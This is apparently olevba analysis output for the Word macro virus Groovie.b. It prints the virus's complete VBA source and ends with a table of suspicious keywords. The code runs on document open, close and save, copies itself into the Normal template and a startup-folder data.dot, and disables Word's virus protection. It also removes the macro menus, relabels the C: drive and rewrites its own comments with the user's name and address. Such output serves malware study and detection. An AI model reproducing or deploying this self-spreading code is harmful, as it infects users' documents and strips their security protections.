olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-5c9034c5c601187966847518a24eac43bd90d8bc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-5c9034c5c601187966847518a24eac43bd90d8bc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-5c9034c5c601187966847518a24eac43bd90d8bc - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' A21/09/02 15:44:2461Ashling61
Public I02 As Boolean
 ' A21/09/02 15:44:2561Ashling61
Public I03 As Boolean
 ' A21/09/02 15:44:2561Ashling61
Public I04 As Boolean
 ' A21/09/02 15:44:2561Ashling61
Public I05 As Boolean
 ' A21/09/02 15:44:2561Ashling61
Public I06 As String
 ' A21/09/02 15:44:2561Ashling61
Public I07 As Boolean
 ' A21/09/02 15:44:2561Ashling61
Public I08 As Boolean
 ' A21/09/02 15:44:2561Ashling61
Function I09()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
    If MacroContainer = NormalTemplate Then
 ' A21/09/02 15:44:2561Ashling61
        I01 = "normal"
 ' A21/09/02 15:44:2561Ashling61
        GoTo checkout
 ' A21/09/02 15:44:2561Ashling61
    End If
 ' A21/09/02 15:44:2561Ashling61
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' A21/09/02 15:44:2561Ashling61
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' A21/09/02 15:44:2561Ashling61
checkout:
 ' A21/09/02 15:44:2561Ashling61
End Function
 ' A21/09/02 15:44:2561Ashling61
Function I10()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' A21/09/02 15:44:2561Ashling61
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' A21/09/02 15:44:2561Ashling61
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' A21/09/02 15:44:2561Ashling61
    Next i
 ' A21/09/02 15:44:2561Ashling61
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' A21/09/02 15:44:2561Ashling61
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' A21/09/02 15:44:2561Ashling61
    Next i
 ' A21/09/02 15:44:2561Ashling61
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' A21/09/02 15:44:2561Ashling61
End Function
 ' A21/09/02 15:44:2561Ashling61
Function I11()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
Call I09
 ' A21/09/02 15:44:2561Ashling61
Call I10
 ' A21/09/02 15:44:2561Ashling61
    If I01 = "document" Then Call I12
 ' A21/09/02 15:44:2561Ashling61
    If I01 = "normal" Then Call I13
 ' A21/09/02 15:44:2561Ashling61
    If I01 = "orbit" Then Call I14
 ' A21/09/02 15:44:2561Ashling61
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' A21/09/02 15:44:2561Ashling61
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' A21/09/02 15:44:2561Ashling61
End Function
 ' A21/09/02 15:44:2561Ashling61
Function I12()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' A21/09/02 15:44:2561Ashling61
    If I03 = False And I05 = False Then
 ' A21/09/02 15:44:2561Ashling61
        With NormalTemplate.VBProject
 ' A21/09/02 15:44:2561Ashling61
        With .VBComponents.Import("c:\groovie.sys")
 ' A21/09/02 15:44:2561Ashling61
        End With
 ' A21/09/02 15:44:2561Ashling61
        End With
 ' A21/09/02 15:44:2561Ashling61
    End If
 ' A21/09/02 15:44:2561Ashling61
    If I02 = False Then
 ' A21/09/02 15:44:2561Ashling61
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' A21/09/02 15:44:2561Ashling61
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' A21/09/02 15:44:2561Ashling61
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' A21/09/02 15:44:2561Ashling61
        If I08 = False Then Documents.Open FileName:=I06
 ' A21/09/02 15:44:2561Ashling61
        Shell ("label c: groovie"), 0
 ' A21/09/02 15:44:2561Ashling61
        Windows(1).Close
 ' A21/09/02 15:44:2561Ashling61
    End If
 ' A21/09/02 15:44:2561Ashling61
End Function
 ' A21/09/02 15:44:2561Ashling61
Function I13()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
Application.ScreenUpdating = False
 ' A21/09/02 15:44:2561Ashling61
    Call I17
 ' A21/09/02 15:44:2561Ashling61
    If I04 = False And I07 = True Then
 ' A21/09/02 15:44:2561Ashling61
        With ActiveDocument.VBProject
 ' A21/09/02 15:44:2561Ashling61
        With .VBComponents.Import("c:\groovie.sys")
 ' A21/09/02 15:44:2561Ashling61
        End With
 ' A21/09/02 15:44:2561Ashling61
        End With
 ' A21/09/02 15:44:2561Ashling61
        With Dialogs(wdDialogFileSummaryInfo)
 ' A21/09/02 15:44:2561Ashling61
            .Comments = "ALT-F11 says it's groovie!"
 ' A21/09/02 15:44:2561Ashling61
            .Execute
 ' A21/09/02 15:44:2561Ashling61
        End With
 ' A21/09/02 15:44:2561Ashling61
    End If
 ' A21/09/02 15:44:2561Ashling61
    If I02 = False And I07 = True Then
 ' A21/09/02 15:44:2561Ashling61
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' A21/09/02 15:44:2561Ashling61
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' A21/09/02 15:44:2561Ashling61
        If I08 = False Then Documents.Open FileName:=I06
 ' A21/09/02 15:44:2561Ashling61
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' A21/09/02 15:44:2561Ashling61
    End If
 ' A21/09/02 15:44:2561Ashling61
    If I02 = False And I07 = False Then
 ' A21/09/02 15:44:2561Ashling61
        Documents.Add Template:="", NewTemplate:=False
 ' A21/09/02 15:44:2561Ashling61
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' A21/09/02 15:44:2561Ashling61
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' A21/09/02 15:44:2561Ashling61
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' A21/09/02 15:44:2561Ashling61
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' A21/09/02 15:44:2561Ashling61
    End If
 ' A21/09/02 15:44:2561Ashling61
Application.ScreenUpdating = True
 ' A21/09/02 15:44:2561Ashling61
End Function
 ' A21/09/02 15:44:2561Ashling61
Function I14()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
Application.ScreenUpdating = False
 ' A21/09/02 15:44:2561Ashling61
        If I03 = False And I05 = False Then
 ' A21/09/02 15:44:2561Ashling61
            With NormalTemplate.VBProject
 ' A21/09/02 15:44:2561Ashling61
            With .VBComponents.Import("c:\groovie.sys")
 ' A21/09/02 15:44:2561Ashling61
            End With
 ' A21/09/02 15:44:2561Ashling61
            End With
 ' A21/09/02 15:44:2561Ashling61
            NormalTemplate.Save
 ' A21/09/02 15:44:2561Ashling61
        End If
 ' A21/09/02 15:44:2561Ashling61
        If I04 = False Then
 ' A21/09/02 15:44:2561Ashling61
            With ActiveDocument.VBProject
 ' A21/09/02 15:44:2561Ashling61
            With .VBComponents.Import("c:\groovie.sys")
 ' A21/09/02 15:44:2561Ashling61
            End With
 ' A21/09/02 15:44:2561Ashling61
            End With
 ' A21/09/02 15:44:2561Ashling61
            With Dialogs(wdDialogFileSummaryInfo)
 ' A21/09/02 15:44:2561Ashling61
                .Comments = "ALT-F11 says it's groovie!"
 ' A21/09/02 15:44:2561Ashling61
                .Execute
 ' A21/09/02 15:44:2561Ashling61
            End With
 ' A21/09/02 15:44:2561Ashling61
        End If
 ' A21/09/02 15:44:2561Ashling61
Application.ScreenUpdating = True
 ' A21/09/02 15:44:2561Ashling61
End Function
 ' A21/09/02 15:44:2561Ashling61
Function I15()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
    Options.VirusProtection = False
 ' A21/09/02 15:44:2561Ashling61
    Options.SaveNormalPrompt = False
 ' A21/09/02 15:44:2561Ashling61
    Options.ConfirmConversions = False
 ' A21/09/02 15:44:2561Ashling61
    I06 = ActiveDocument.FullName
 ' A21/09/02 15:44:2561Ashling61
    Call I11
 ' A21/09/02 15:44:2561Ashling61
End Function
 ' A21/09/02 15:44:2561Ashling61
Sub AutoOpen()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
Call I15
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2561Ashling61
Sub AutoClose()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
I08 = True
 ' A21/09/02 15:44:2561Ashling61
Call I15
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2561Ashling61
Sub AutoExit()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
Call I15
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2561Ashling61
Sub FileSaveAs()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
Call I16
 ' A21/09/02 15:44:2561Ashling61
Call I15
 ' A21/09/02 15:44:2561Ashling61
Dialogs(wdDialogFileSaveAs).Show
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2561Ashling61
Sub filesave()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
Call I16
 ' A21/09/02 15:44:2561Ashling61
Call I15
 ' A21/09/02 15:44:2561Ashling61
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2561Ashling61
Sub fileclose()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
I08 = True
 ' A21/09/02 15:44:2561Ashling61
Call I15
 ' A21/09/02 15:44:2561Ashling61
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' A21/09/02 15:44:2561Ashling61
ActiveDocument.Close
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2561Ashling61
Sub fileprint()
 ' A21/09/02 15:44:2561Ashling61
On Error Resume Next
 ' A21/09/02 15:44:2561Ashling61
Call I15
 ' A21/09/02 15:44:2561Ashling61
Dialogs(wdDialogFilePrint).Show
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2561Ashling61
Sub ViewVBCode()
 ' A21/09/02 15:44:2561Ashling61
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2561Ashling61
Sub ToolsMacro()
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2561Ashling61
Sub FileTemplates()
 ' A21/09/02 15:44:2561Ashling61
End Sub
 ' A21/09/02 15:44:2661Ashling61
Function I17()
 ' A21/09/02 15:44:2661Ashling61
On Error GoTo docek
 ' A21/09/02 15:44:2661Ashling61
    If ActiveDocument.Name <> "" Then
 ' A21/09/02 15:44:2661Ashling61
        I07 = True
 ' A21/09/02 15:44:2661Ashling61
    End If
 ' A21/09/02 15:44:2661Ashling61
    GoTo over
 ' A21/09/02 15:44:2661Ashling61
docek:
 ' A21/09/02 15:44:2661Ashling61
    I07 = False
 ' A21/09/02 15:44:2661Ashling61
over:
 ' A21/09/02 15:44:2661Ashling61
End Function
 ' A21/09/02 15:44:2661Ashling61
Function I16()
 ' A21/09/02 15:44:2661Ashling61
Randomize
 ' A21/09/02 15:44:2661Ashling61
rn = Int(Rnd * 999)
 ' A21/09/02 15:44:2661Ashling61
With Application.VBE.ActiveVBProject.VBComponents("Groovie").codemodule
 ' A21/09/02 15:44:2661Ashling61
For x = 2 To 358 Step 2
 ' A21/09/02 15:44:2661Ashling61
.deletelines x
 ' A21/09/02 15:44:2661Ashling61
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' A21/09/02 15:44:2661Ashling61
Next x
 ' A21/09/02 15:44:2661Ashling61
End With
 ' A21/09/02 15:44:2661Ashling61
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

